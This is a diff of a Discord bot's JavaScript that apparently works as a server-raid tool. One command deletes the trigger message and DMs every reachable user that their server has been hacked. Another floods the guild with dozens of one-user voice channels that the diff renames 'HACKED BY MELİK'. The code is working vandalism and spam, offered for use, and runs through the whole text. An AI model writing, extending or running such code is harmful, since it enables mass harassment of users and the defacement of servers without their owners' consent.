@@ -21,11 +21,12 @@ client.on("message", msg => {
 
 client.on("message", async msg => {
   if (msg.content === "+duyur") {
+    //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
     msg.delete();
     await msg.client.users
       .forEach(users =>
         users.send(
-          "**bulunduğun sunucu hacklendi kolay gelsin iyi günler**:heart: :wink:"
+          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:" //HERKESE DMDEN ATILAN MESAJ
         )
       )
       .catch(console.error);
@@ -63,56 +64,21 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -126,7 +92,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -147,56 +148,21 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -210,43 +176,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("DOĞACAĞIZ", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-
-    await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -260,42 +211,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -317,56 +233,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -380,7 +261,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -402,56 +318,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -465,7 +346,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -487,56 +403,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -550,7 +431,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -572,56 +488,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -635,7 +516,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -657,56 +573,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -720,7 +601,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -742,56 +658,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -805,7 +686,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -827,56 +743,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -890,7 +771,43 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      }) 
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -912,56 +829,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -975,7 +857,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -997,56 +914,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -1060,7 +942,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      }) 
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -1082,56 +999,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
-    await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+    await msg.guild 
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -1145,7 +1027,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -1167,56 +1084,21 @@ client.on("message", async msg => {
       });
 
     await msg.guild
-      .createChannel("BU SUNUCU", {
+      .createChannel("HACKED BY", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
     await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    await msg.guild
-      .createChannel("YENİLMEYİZ", {
+      .createChannel("Hacked by melik", {
         type: "voice"
       })
       .then(chan => {
@@ -1230,7 +1112,42 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     await msg.guild
